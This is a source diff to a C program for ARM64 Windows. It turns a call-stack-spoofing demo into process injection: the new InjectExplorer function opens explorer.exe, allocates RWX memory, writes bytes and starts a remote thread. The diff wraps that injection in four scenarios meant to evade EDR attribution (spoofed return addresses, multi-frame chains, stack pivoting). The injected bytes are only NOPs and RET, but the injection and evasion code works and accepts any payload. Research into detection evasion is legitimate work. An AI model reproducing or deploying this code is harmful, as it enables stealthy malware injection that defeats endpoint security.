@@ -24,6 +24,12 @@
  * recursion, to ensure that the walker based on .pdata see as top stack frame
  * the one with the spoofed return address.
  *
+ * Target function replaced with InjectExplorer: realistic process-injection
+ * pattern (OpenProcess + VirtualAllocEx RWX + WriteProcessMemory +
+ * CreateRemoteThread) on explorer.exe, to trigger EDR behavioral detection
+ * and demonstrate call-stack attribution evasion across all 4 spoofing
+ * scenarios.
+ *
  * Compilation:
  * cl /O2 /MT stack_spoof_arm64.c stack_spoof_arm64.obj /link /MACHINE:ARM64
  * dbghelp.lib
@@ -33,13 +39,14 @@
  * Misuse of this code may violate laws and regulations.
  */
 
+#include <windows.h>
+#include <winternl.h>
 #include <dbghelp.h>
+#include <tlhelp32.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
-#include <windows.h>
-#include <winternl.h>
 
 #pragma comment(lib, "dbghelp.lib")
 #pragma comment(lib, "ntdll.lib")
@@ -151,101 +158,145 @@ typedef struct _SPOOF_STATS {
  * ============================================================================
  */
 
-static volatile BOOL g_captureStack = TRUE;
-static volatile DWORD g_secretValue = 0;
 static GADGET_CACHE g_gadgetCache = {0};
 static SPOOF_STATS g_stats = {0};
 
 /* ============================================================================
- * TARGET FUNCTIONS
+ * TARGET FUNCTION
  * ============================================================================
  */
 
 /**
- * @brief Demonstration target function to be concealed
+ * @brief Realistic process-injection target: full injection pattern on
+ * explorer.exe
  *
- * This function simulates sensitive operations that we want to hide
- * from stack-walking security tools. In a real scenario, this could
- * be any function performing security-sensitive operations.
+ * Simulates the classic worm/implant injection pattern:
+ *   OpenProcess (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD)
+ *   VirtualAllocEx RWX
+ *   WriteProcessMemory (ARM64 benign payload: 3x NOP + RET)
+ *   CreateRemoteThread (executes payload, terminates immediately)
  *
- * @param param Input parameter (demonstration value)
- * @return Transformed value based on input
+ * This sequence triggers EDR behavioral detection (MDE ProcessAccess +
+ * VirtualAlloc + WriteProcessMemory chain). The call stack visible to the
+ * EDR at OpenProcess / CreateRemoteThread is what the spoofing techniques
+ * manipulate across the 4 test scenarios.
+ *
+ * No harmful payload -- the injected bytes are 3 NOPs + RET. The behavioral
+ * signal is the API call pattern itself, not the payload content.
+ *
+ * @param param Unused
+ * @return TRUE if injection completed, FALSE on any API failure
  */
-__declspec(noinline) DWORD WINAPI SecretFunction(LPVOID param) {
-  DWORD value = (DWORD)(ULONG_PTR)param;
+__declspec(noinline) BOOL WINAPI InjectExplorer(LPVOID param) {
+    UNREFERENCED_PARAMETER(param);
+    printf("\n  [>] Executing concealed function: InjectExplorer\n");
+    printf("      Target: explorer.exe -- full injection pattern\n");
 
-  printf("\n  [>] Executing concealed function\n");
-  printf("      Parameter: 0x%08X\n", value);
-
-  if (g_captureStack) {
-    printf("\n  [STACK TRACE] From inside concealed function:\n");
+    printf("\n  [STACK TRACE] From inside InjectExplorer (user-mode view):\n");
     void *backtrace[12];
     USHORT frames = CaptureStackBackTrace(0, 12, backtrace, NULL);
 
     for (USHORT i = 0; i < frames; i++) {
-      char buffer[sizeof(SYMBOL_INFO) + 256];
-      PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
-      pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
-      pSymbol->MaxNameLen = 256;
-      DWORD64 displacement = 0;
+        char buffer[sizeof(SYMBOL_INFO) + 256];
+        PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
+        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
+        pSymbol->MaxNameLen = 256;
+        DWORD64 displacement = 0;
 
-      if (SymFromAddr(GetCurrentProcess(), (DWORD64)backtrace[i], &displacement,
-                      pSymbol)) {
-        const char *marker = "";
-        if (strstr(pSymbol->Name, "Secret")) {
-          marker = " <-- TARGET";
-        } else if (displacement == 0 && i == 1) {
-          marker = " <-- SPOOFED";
+        if (SymFromAddr(GetCurrentProcess(), (DWORD64)backtrace[i],
+                        &displacement, pSymbol)) {
+            const char *marker = "";
+            if (strstr(pSymbol->Name, "Inject"))
+                marker = " <-- TARGET";
+            else if (displacement == 0 && i == 1)
+                marker = " <-- SPOOFED";
+
+            printf("      [%02d] %-40s + 0x%04llX%s\n", i, pSymbol->Name,
+                   displacement, marker);
+        } else {
+            printf("      [%02d] 0x%p (unresolved)\n", i, backtrace[i]);
         }
-
-        printf("      [%02d] %-32s + 0x%04llX%s\n", i, pSymbol->Name,
-               displacement, marker);
-      } else {
-        printf("      [%02d] 0x%p (unresolved)\n", i, backtrace[i]);
-      }
     }
-  }
+    if (frames == 0)
+        printf("      (no frames -- stack pivot active)\n");
 
-  // Simulated operation
-  g_secretValue = value ^ 0xDEADBEEF;
-  printf("\n  [>] Operation complete (Result: 0x%08X)\n", g_secretValue);
+    // Find explorer.exe PID
+    DWORD explorerPid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) {
+        printf("  [ERROR] CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
+        return FALSE;
+    }
+    PROCESSENTRY32W pe = {sizeof(pe)};
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (wcscmp(pe.szExeFile, L"explorer.exe") == 0) {
+                explorerPid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    if (!explorerPid) {
+        printf("  [ERROR] explorer.exe not found\n");
+        return FALSE;
+    }
+    printf("  [>] Found explorer.exe PID: %lu\n", explorerPid);
 
-  return g_secretValue;
-}
+    // OpenProcess
+    HANDLE hProc = OpenProcess(
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        FALSE, explorerPid);
+    if (!hProc) {
+        printf("  [ERROR] OpenProcess failed (%lu)\n", GetLastError());
+        return FALSE;
+    }
+    printf("  [>] OpenProcess handle: 0x%p\n", hProc);
 
-/**
- * @brief Target function to launch a process (notepad.exe)
- *
- * This function will be called using one of the spoofing techniques.
- * The process creation will appear to originate from a legitimate context.
- *
- * @param param Unused parameter
- * @return TRUE if process was launched successfully, FALSE otherwise
- */
-__declspec(noinline) BOOL WINAPI LaunchNotepad(LPVOID param) {
-  UNREFERENCED_PARAMETER(param);
-  printf("\n  [>] Executing concealed function: LaunchNotepad\n");
+    // VirtualAllocEx RWX
+    LPVOID remMem = VirtualAllocEx(
+        hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remMem) {
+        printf("  [ERROR] VirtualAllocEx failed (%lu)\n", GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    printf("  [>] VirtualAllocEx RWX at: 0x%p\n", remMem);
 
-  wchar_t cmd[] = L"C:\\Windows\\System32\\notepad.exe";
-  STARTUPINFOW si = {sizeof(si)};
-  PROCESS_INFORMATION pi = {0};
+    // ARM64 benign payload: 3x NOP + RET
+    BYTE payload[] = {
+        0x1F, 0x20, 0x03, 0xD5,  // NOP
+        0x1F, 0x20, 0x03, 0xD5,  // NOP
+        0x1F, 0x20, 0x03, 0xD5,  // NOP
+        0xC0, 0x03, 0x5F, 0xD6   // RET
+    };
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, remMem, payload, sizeof(payload), &written)) {
+        printf("  [ERROR] WriteProcessMemory failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    printf("  [>] WriteProcessMemory: %zu bytes written\n", written);
 
-  BOOL success =
-      CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    // CreateRemoteThread -- executes NOP+RET payload, terminates immediately
+    HANDLE hThread = CreateRemoteThread(
+        hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remMem, NULL, 0, NULL);
+    if (!hThread) {
+        printf("  [ERROR] CreateRemoteThread failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    printf("  [>] CreateRemoteThread: TID handle 0x%p\n", hThread);
 
-  if (success) {
-    printf("  [>] Successfully launched notepad.exe (PID: %lu)\n",
-           pi.dwProcessId);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-  } else {
-    printf("  [ERROR] Failed to launch notepad.exe (Error: %lu)\n",
-           GetLastError());
-  }
+    WaitForSingleObject(hThread, 2000);
+    CloseHandle(hThread);
+    VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
+    CloseHandle(hProc);
 
-  // No stack trace here to keep output clean for this specific scenario
-  printf("\n  [>] Operation complete\n");
-  return success;
+    printf("\n  [>] Injection complete -- payload executed in explorer.exe\n");
+    return TRUE;
 }
 
 /* ============================================================================
@@ -472,25 +523,31 @@ RecursiveSpoofHelper(RECURSIVE_SPOOF_CONTEXT *ctx) {
  */
 
 /**
- * @brief Scenario 1: Baseline direct execution
+ * @brief Scenario 1: Baseline direct injection (no spoofing)
+ *
+ * Ground truth: MDE/EDR sees the real call stack with stack_spoof.exe as
+ * the attribution root. InjectExplorer caller chain fully visible.
  */
-void TestNormalExecution(void) {
-  PrintSeparator("SCENARIO 1: BASELINE - DIRECT FUNCTION INVOCATION");
+void TestInjectionBaseline(void) {
+  PrintSeparator("SCENARIO 1: BASELINE -- DIRECT INJECTION (NO SPOOFING)");
 
-  printf("\n[INFO] Establishing baseline with direct function call\n");
-  printf("[INFO] Expected: Full call stack visible to security tools\n");
+  printf("\n[INFO] Direct call to InjectExplorer -- no stack manipulation\n");
+  printf("[INFO] Expected: EDR sees real call chain, stack_spoof.exe attributed\n");
 
   LARGE_INTEGER start, end, freq;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&start);
 
-  DWORD result = SecretFunction((LPVOID)0x11111111);
+  BOOL result = InjectExplorer(NULL);
 
   QueryPerformanceCounter(&end);
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
-  printf("\n[SUCCESS] Direct execution completed in %llu ms\n", elapsed);
-  printf("[INFO] Result: 0x%08X\n", result);
+  if (result) {
+    printf("\n[SUCCESS] Baseline injection completed in %llu ms\n", elapsed);
+  } else {
+    printf("\n[FAILURE] Baseline injection failed in %llu ms\n", elapsed);
+  }
 
   g_stats.totalExecutions++;
   g_stats.baselineExecutions++;
@@ -498,10 +555,14 @@ void TestNormalExecution(void) {
 }
 
 /**
- * @brief Scenario 2: Single-frame spoofing
+ * @brief Scenario 2: Single-frame spoofed injection
+ *
+ * SpoofCallStack replaces the caller return address with a random ntdll gadget.
+ * EDR sees ntdll as the caller of InjectExplorer -- stack_spoof.exe hidden.
+ * CaptureStackBackTrace: InjectExplorer + ntdll gadget + NULL chain break.
  */
-void TestBasicSpoofing(void) {
-  PrintSeparator("SCENARIO 2: SINGLE-FRAME CALL STACK SPOOFING");
+void TestInjectionSingleFrame(void) {
+  PrintSeparator("SCENARIO 2: SINGLE-FRAME SPOOFED INJECTION");
 
   void *spoofedReturnGadget = GetRandomGadget(&g_gadgetCache);
   if (!spoofedReturnGadget) {
@@ -509,9 +570,10 @@ void TestBasicSpoofing(void) {
     return;
   }
 
-  printf("\n[INFO] Executing with spoofed return address\n");
+  printf("\n[INFO] Executing InjectExplorer with spoofed return address\n");
   printf("[INFO] Gadget source: %s\n", g_gadgetCache.moduleName);
   printf("[INFO] Spoofed return: 0x%p\n", spoofedReturnGadget);
+  printf("[INFO] Expected: EDR sees ntdll as caller, stack_spoof.exe absent\n");
 
   void *realReturn = NULL;
 
@@ -519,13 +581,14 @@ void TestBasicSpoofing(void) {
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&start);
 
-  DWORD64 result = SpoofCallStack(SecretFunction, spoofedReturnGadget,
-                                  (LPVOID)0x22222222, &realReturn);
+  DWORD64 result = SpoofCallStack(InjectExplorer, spoofedReturnGadget,
+                                  NULL, &realReturn);
 
   QueryPerformanceCounter(&end);
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
-  printf("\n[SUCCESS] Spoofed execution completed in %llu ms\n", elapsed);
+  printf("\n[SUCCESS] Single-frame spoofed injection completed in %llu ms\n",
+         elapsed);
   printf("[INFO] Result: 0x%08llX\n", result);
   printf("[DEBUG] Real return address was: 0x%p\n", realReturn);
 
@@ -537,12 +600,17 @@ void TestBasicSpoofing(void) {
 }
 
 /**
- * @brief Scenario 3: Multi-frame chain spoofing using recursion
+ * @brief Scenario 3: Multi-frame chain spoofed injection
+ *
+ * RecursiveSpoofHelper builds CHAIN_DEPTH real frames, each with a spoofed
+ * return address from ntdll. The resulting call chain is structurally valid
+ * (.pdata-consistent, SP in TEB bounds) but attribution is fully redirected.
+ * Hardest scenario for user-mode EDR to flag as anomalous.
  */
-void TestAdvancedSpoofing(void) {
-  PrintSeparator("SCENARIO 3: TRUE MULTI-FRAME CALL CHAIN SPOOFING");
+void TestInjectionMultiFrame(void) {
+  PrintSeparator("SCENARIO 3: MULTI-FRAME CHAIN SPOOFED INJECTION");
 
-#define CHAIN_DEPTH 2 // How many fake frames to insert
+#define CHAIN_DEPTH 2
 
   if (g_gadgetCache.count < CHAIN_DEPTH) {
     printf("\n[WARNING] Insufficient gadgets for %d-frame chain (have %d)\n",
@@ -551,13 +619,10 @@ void TestAdvancedSpoofing(void) {
   }
 
   printf("\n[INFO] Building TRUE %d-frame deep call chain using recursive "
-         "spoofing\n",
-         CHAIN_DEPTH);
-  printf("[INFO] This technique creates real frames with spoofed return "
-         "addresses\n");
+         "spoofing\n", CHAIN_DEPTH);
+  printf("[INFO] Expected: structurally valid chain, SP in TEB bounds, "
+         "attribution redirected to ntdll\n");
 
-  // Build array of spoofed return addresses (CHAIN_DEPTH levels + 1 for base
-  // case)
   void *spoofChain[CHAIN_DEPTH + 1];
   printf("\n  Multi-frame chain composition:\n");
 
@@ -565,7 +630,6 @@ void TestAdvancedSpoofing(void) {
     spoofChain[i] = GetRandomGadget(&g_gadgetCache);
     printf("    Frame[%d]: 0x%p", i, spoofChain[i]);
 
-    // Resolve and display the symbol for clarity
     char buffer[sizeof(SYMBOL_INFO) + 256];
     PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
     pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
@@ -579,34 +643,30 @@ void TestAdvancedSpoofing(void) {
     printf("\n");
   }
 
-  // Set up recursion context
-  RECURSIVE_SPOOF_CONTEXT ctx = {.targetFunc = SecretFunction,
-                                 .parameter = (void *)0x33333333,
+  RECURSIVE_SPOOF_CONTEXT ctx = {.targetFunc = InjectExplorer,
+                                 .parameter = NULL,
                                  .spoofChain = spoofChain,
                                  .currentDepth = 0,
                                  .maxDepth = CHAIN_DEPTH,
                                  .result = 0};
 
   printf("\n[INFO] Executing with %d levels of recursion, each with spoofed "
-         "return\n",
-         CHAIN_DEPTH);
+         "return\n", CHAIN_DEPTH);
 
   LARGE_INTEGER start, end, freq;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&start);
 
-  // Start the recursive spoofing chain
   RecursiveSpoofHelper(&ctx);
   DWORD64 result = ctx.result;
 
   QueryPerformanceCounter(&end);
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
-  printf("\n[SUCCESS] TRUE multi-frame execution completed in %llu ms\n",
+  printf("\n[SUCCESS] Multi-frame spoofed injection completed in %llu ms\n",
          elapsed);
   printf("[INFO] Result: 0x%08llX\n", result);
-  printf("[INFO] Expected: %d spoofed frames should appear in the call stack\n",
-         CHAIN_DEPTH);
+  printf("[INFO] %d spoofed frames visible in call stack\n", CHAIN_DEPTH);
 
   g_stats.totalExecutions++;
   g_stats.spoofAttempts++;
@@ -616,14 +676,19 @@ void TestAdvancedSpoofing(void) {
 }
 
 /**
- * @brief Scenario 4: Stack pivoting with isolated execution
+ * @brief Scenario 4: Stack pivot injection
+ *
+ * ExecuteWithFakeFrame pivots SP to a VirtualAlloc'd region outside TEB bounds.
+ * CaptureStackBackTrace returns 0 frames -- SP anomaly is the residual signature.
+ * WinDbg emits WARNING and resolves at most 2 frames.
  */
-void TestFakeFrameExecution(void) {
-  PrintSeparator("SCENARIO 4: STACK PIVOTING & EXECUTION ISOLATION");
+void TestInjectionStackPivot(void) {
+  PrintSeparator("SCENARIO 4: STACK PIVOT INJECTION");
 
   printf("\n[INFO] Preparing isolated execution environment\n");
+  printf("[INFO] Expected: 0 frames from CaptureStackBackTrace, "
+         "SP outside TEB bounds\n");
 
-  // Allocate isolated stack
   SIZE_T fakeStackSize = DEFAULT_STACK_SIZE;
   void *fakeStackBase = VirtualAlloc(NULL, fakeStackSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -637,7 +702,6 @@ void TestFakeFrameExecution(void) {
   printf("[SUCCESS] Allocated %zu KB isolated stack at 0x%p\n",
          fakeStackSize / 1024, fakeStackBase);
 
-  // Prepare fake frame
   void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + fakeStackSize);
   FAKE_FRAME_DATA fakeFrame = {.fakeFp =
                                    (void *)((ULONG_PTR)fakeStackTop - 0x100),
@@ -647,91 +711,25 @@ void TestFakeFrameExecution(void) {
   printf("[INFO] Fake frame configuration:\n");
   printf("      FP: 0x%p\n", fakeFrame.fakeFp);
   printf("      LR: 0x%p\n", fakeFrame.fakeLr);
-  printf("      SP: 0x%p\n", fakeFrame.fakeSp);
+  printf("      SP: 0x%p  (outside TEB StackBase/StackLimit)\n",
+         fakeFrame.fakeSp);
 
   LARGE_INTEGER start, end, freq;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&start);
 
-  // Disable stack capture for this test to avoid polluting output
-  g_captureStack = FALSE;
-  DWORD64 result =
-      ExecuteWithFakeFrame(SecretFunction, &fakeFrame, (LPVOID)0x44444444);
-  g_captureStack = TRUE; // Re-enable for other tests
-
-  QueryPerformanceCounter(&end);
-  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
-
-  printf("\n[SUCCESS] Isolated execution completed in %llu ms\n", elapsed);
-  printf("[INFO] Result: 0x%08llX\n", result);
-  printf("[INFO] Stack isolation prevented normal stack walking\n");
-
-  // Cleanup
-  VirtualFree(fakeStackBase, 0, MEM_RELEASE);
-  printf("[DEBUG] Released isolated stack memory\n");
-
-  g_stats.totalExecutions++;
-  g_stats.spoofAttempts++;
-  if (result)
-    g_stats.successfulSpoofs++;
-  g_stats.totalTimeMs += elapsed;
-}
-
-/**
- * @brief Scenario 5: Spoofed process launch using stack pivoting
- */
-void TestProcessLaunchSpoofing(void) {
-  PrintSeparator("SCENARIO 5: SPOOFED PROCESS LAUNCH VIA STACK PIVOTING");
-
-  printf(
-      "\n[INFO] Preparing isolated execution environment for process launch\n");
-  printf("[INFO] Goal: Launch notepad.exe from a concealed call stack\n");
-
-  // Allocate isolated stack
-  SIZE_T fakeStackSize = DEFAULT_STACK_SIZE;
-  void *fakeStackBase = VirtualAlloc(NULL, fakeStackSize,
-                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-  if (!fakeStackBase) {
-    printf("[ERROR] Failed to allocate isolated stack (Error: %lu)\n",
-           GetLastError());
-    return;
-  }
-
-  printf("[SUCCESS] Allocated %zu KB isolated stack at 0x%p\n",
-         fakeStackSize / 1024, fakeStackBase);
-
-  // Prepare fake frame for the process launch
-  void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + fakeStackSize);
-  FAKE_FRAME_DATA fakeFrame = {.fakeFp =
-                                   (void *)((ULONG_PTR)fakeStackTop - 0x100),
-                               .fakeLr = GetRandomGadget(&g_gadgetCache),
-                               .fakeSp = fakeStackTop};
-
-  printf("[INFO] Fake frame configuration:\n");
-  printf("      FP: 0x%p\n", fakeFrame.fakeFp);
-  printf("      LR: 0x%p\n", fakeFrame.fakeLr);
-  printf("      SP: 0x%p\n", fakeFrame.fakeSp);
-
-  LARGE_INTEGER start, end, freq;
-  QueryPerformanceFrequency(&freq);
-  QueryPerformanceCounter(&start);
-
-  DWORD64 result =
-      ExecuteWithFakeFrame(LaunchNotepad, &fakeFrame,
-                           NULL); // No parameter needed for LaunchNotepad
+  DWORD64 result = ExecuteWithFakeFrame(InjectExplorer, &fakeFrame, NULL);
 
   QueryPerformanceCounter(&end);
   DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
 
   if (result) {
-    printf("\n[SUCCESS] Isolated process launch completed in %llu ms\n",
-           elapsed);
+    printf("\n[SUCCESS] Stack pivot injection completed in %llu ms\n", elapsed);
   } else {
-    printf("\n[FAILURE] Isolated process launch failed in %llu ms\n", elapsed);
+    printf("\n[FAILURE] Stack pivot injection failed in %llu ms\n", elapsed);
   }
+  printf("[INFO] Stack isolation defeated user-mode stack walking\n");
 
-  // Cleanup
   VirtualFree(fakeStackBase, 0, MEM_RELEASE);
   printf("[DEBUG] Released isolated stack memory\n");
 
@@ -793,7 +791,7 @@ void PrintStatistics(void) {
   }
 
   printf("    * Technique Coverage:   ");
-  printf("Single-Frame | Multi-Frame | Stack Pivot | Process Launch\n");
+  printf("Baseline | Single-Frame | Multi-Frame | Stack Pivot\n");
 }
 
 /* ============================================================================
@@ -827,18 +825,16 @@ int main(void) {
   }
 
   // Execute test scenarios
-  TestNormalExecution();
-  TestBasicSpoofing();
-  TestAdvancedSpoofing();
-  TestFakeFrameExecution();
-  TestProcessLaunchSpoofing();
+  TestInjectionBaseline();
+  TestInjectionSingleFrame();
+  TestInjectionMultiFrame();
+  TestInjectionStackPivot();
 
   // Print summary
   PrintStatistics();
 
   printf("\n");
-  printf("[SUCCESS] All scenarios completed successfully\n");
-  printf("[INFO] Final concealed value: 0x%08X\n", g_secretValue);
+  printf("[SUCCESS] All injection scenarios completed\n");
 
   // Cleanup
   SymCleanup(GetCurrentProcess());
